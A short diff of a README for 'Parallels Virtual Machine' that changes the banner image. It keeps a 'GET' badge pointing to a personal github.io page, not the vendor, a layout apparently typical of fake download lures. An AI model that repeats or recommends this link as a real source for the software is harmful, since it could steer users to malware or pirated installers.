@@ -1,6 +1,6 @@
 # Parallels Virtual Machine — Windows and Linux Virtualization on Mac
 
-![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Parallels_Logo.svg/3840px-Parallels_Logo.svg.png)
+![Banner Placeholder](https://root-nation.com/wp-content/uploads/2015/01/parallels_title.jpg)
 
 [![GET — Parallels Virtual Machine](https://img.shields.io/badge/GET%20%E2%80%94%20Parallels%20Virtual%20Machine-0078D6?style=for-the-badge&logoColor=white)](https://georgineerie233.github.io/.github/Parallels-Virtual-Machine)
 
